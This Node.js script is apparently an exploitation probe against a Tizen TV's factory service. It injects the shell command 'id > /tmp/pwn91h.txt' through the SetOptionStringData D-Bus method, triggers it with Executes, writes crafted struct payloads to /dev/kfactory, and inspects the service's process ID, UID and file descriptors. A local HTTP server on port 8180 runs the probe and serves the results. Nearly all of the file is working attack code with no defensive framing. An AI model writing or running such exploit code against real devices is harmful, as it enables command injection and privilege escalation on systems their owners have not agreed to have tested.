'use strict';
var http = require('http');
var fs = require('fs');
var cp = require('child_process');

var PORT = 8180;
var PROBE_FILE = '/home/owner/share/tmp/sdk_tools/tbprobe91h.txt';
var PWN = '/tmp/pwn91h.txt';

var L = [
  'var fs = require("fs");',
  'var cp = require("child_process");',
  'var r = {};',

  // 1. GetItem(0..5) to understand factory item structure
  'r.items_0_5 = {};',
  'for (var gk = 0; gk <= 5; gk++) {',
  '  try {',
  '    var o = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetItem",String(gk)],{timeout:4000});',
  '    r.items_0_5["k"+gk] = (o.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '  } catch(e) {}',
  '}',

  // 2. GetOptionStringData(3) - see current value before writing
  'try {',
  '  var o_go = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetOptionStringData","3"],{timeout:5000});',
  '  r.get_opt_3_before = (o_go.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '} catch(e) { r.get_opt_3_before_err = e.message.slice(0,60); }',

  // 3. SetOptionStringData(3, injection, len) - injection attempt!
  'try {',
  '  var inj = "id > ' + PWN + '";',
  '  var o_so = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.SetOptionStringData","3",inj,String(inj.length)],{timeout:5000});',
  '  r.set_opt_3_inject = (o_so.stdout||new Buffer(0)).toString().trim().slice(0,100);',
  '} catch(e) { r.set_opt_3_inject_err = e.message.slice(0,60); }',

  // 4. Verify stored
  'try {',
  '  var o_go2 = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.GetOptionStringData","3"],{timeout:5000});',
  '  r.get_opt_3_after = (o_go2.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '} catch(e) {}',

  // 5. Executes(3, cmd=0..5) - try all cmds, check pwn after each
  'r.exec3_cmds = {};',
  'for (var c = 0; c <= 5; c++) {',
  '  try {',
  '    var o_e = cp.spawnSync("gdbus",["call","--system","--dest","org.tizen.tv.factory-service","--object-path","/TIFacSerObj","--method","org.tizen.tv.factoryservice.Executes","3",String(c)],{timeout:8000});',
  '    r.exec3_cmds["c"+c] = (o_e.stdout||new Buffer(0)).toString().trim().slice(0,200);',
  '  } catch(e) { r.exec3_cmds["c"+c] = e.message.slice(0,60); }',
  '}',

  // 6. Check pwn after Executes(3,*)
  'try { r.pwn_after_exec3 = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) { r.pwn_after_exec3_err = e.code; }',

  // 7. Fresh dmesg to see what happened
  'try {',
  '  var o_dm = cp.spawnSync("dmesg",[],{timeout:5000});',
  '  var dm = (o_dm.stdout||new Buffer(0)).toString().split("\\n");',
  '  r.dmesg_after_exec3 = dm.filter(function(l){ return l.indexOf("factory")>-1||l.indexOf("kfac")>-1||l.indexOf("execl")>-1||l.indexOf("shell")>-1||l.indexOf("before")>-1||l.indexOf("system")>-1||l.indexOf("id(")>-1||l.indexOf("cmd(")>-1||l.indexOf("string(")>-1; }).slice(-30).join("\\n").slice(0,3000);',
  '} catch(e) {}',

  // 8. Write 40 bytes to /dev/kfactory with specific struct payloads
  // 40 bytes = 10 x uint32. Try: [type=1, cmd=3, ...zeros]
  'var kfac_payloads = [',
  '  [0,0,0,0, 3,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0],',
  '  [1,0,0,0, 0,0,0,0, 3,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0],',
  '  [1,0,0,0, 3,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0],',
  '  [3,0,0,0, 1,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0]',
  '];',
  'r.kfac_writes = [];',
  'kfac_payloads.forEach(function(payload, idx) {',
  '  try {',
  '    var wfd = fs.openSync("/dev/kfactory", "w");',
  '    var wb = new Buffer(payload);',
  '    var wn = fs.writeSync(wfd, wb, 0, wb.length);',
  '    fs.closeSync(wfd);',
  '    r.kfac_writes.push({ idx: idx, written: wn, first4: payload.slice(0,4) });',
  '  } catch(e) { r.kfac_writes.push({ idx: idx, err: e.message.slice(0,40) }); }',
  '});',

  // 9. Fresh dmesg after kfactory writes - look for factory command processing
  'try {',
  '  var o_dm2 = cp.spawnSync("dmesg",[],{timeout:5000});',
  '  var dm2 = (o_dm2.stdout||new Buffer(0)).toString().split("\\n");',
  '  var kfac2 = dm2.filter(function(l){ return l.indexOf("kfactory")>-1||l.indexOf("factory")>-1; }).slice(-20);',
  '  r.dmesg_after_kfacwrite = kfac2.join("\\n").slice(0,2000);',
  '} catch(e) {}',

  // 10. kfactoryd PID - fix regex to not match uint32
  'try {',
  '  var o_fpid = cp.spawnSync("gdbus",["call","--system","--dest","org.freedesktop.DBus","--object-path","/","--method","org.freedesktop.DBus.GetConnectionUnixProcessID","org.tizen.tv.factory-service"],{timeout:5000});',
  '  var fpid_raw = (o_fpid.stdout||new Buffer(0)).toString().trim();',
  '  r.kfac_pid_raw = fpid_raw;',
  '  var fp_m = fpid_raw.match(/uint32 (\\d+)/);',
  '  if (fp_m) {',
  '    var fpid = fp_m[1];',
  '    r.kfac_pid = fpid;',
  '    try {',
  '      var kst = fs.readFileSync("/proc/"+fpid+"/status","utf8");',
  '      var uid_m = kst.match(/^Uid:\\t(\\d+)/m);',
  '      r.kfac_uid = uid_m ? uid_m[1] : "?";',
  '      var kcomm = fs.readFileSync("/proc/"+fpid+"/comm","utf8").trim();',
  '      r.kfac_comm = kcomm;',
  '    } catch(e) { r.kfac_status_err = e.message.slice(0,60); }',
  '    try {',
  '      var kfds = fs.readdirSync("/proc/"+fpid+"/fd");',
  '      r.kfac_fd_count = kfds.length;',
  '      var kfd_links = [];',
  '      kfds.slice(0,30).forEach(function(fd) {',
  '        try { kfd_links.push(fd + " -> " + fs.readlinkSync("/proc/"+fpid+"/fd/"+fd)); } catch(e) {}',
  '      });',
  '      r.kfac_fd_links = kfd_links;',
  '    } catch(e) { r.kfac_fds_err = e.message.slice(0,60); }',
  '  }',
  '} catch(e) { r.kfac_pid_err = e.message.slice(0,80); }',

  // 11. Final pwn check
  'try { r.pwn_final = fs.readFileSync("' + PWN + '","utf8").trim(); } catch(e) { r.pwn_final_err = e.code; }',

  'var out = JSON.stringify(r,null,2);',
  'try { fs.writeFileSync("' + PROBE_FILE + '",out); } catch(e2) {}',
  'process.stdout.write(out);'
];

var INNER = L.join('\n');

function runProbe(cb) {
  cp.execFile(process.execPath, ['-e', INNER], { timeout: 150000 }, function(err, stdout, stderr) {
    if (err) {
      cb(JSON.stringify({ exec_error: err.message.slice(0,200), stderr: (stderr||'').slice(0,500) }));
    } else {
      cb(stdout || '{}');
    }
  });
}

var server = http.createServer(function(req, res) {
  runProbe(function(out) {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(out);
  });
});

server.on('error', function(e) {
  try { fs.writeFileSync(PROBE_FILE, JSON.stringify({ server_err: e.message })); } catch(e2) {}
});

server.listen(PORT, '127.0.0.1', function() {
  runProbe(function(out) {
    try { fs.writeFileSync(PROBE_FILE, out); } catch(e) {}
  });
});

setInterval(function() {}, 60000);
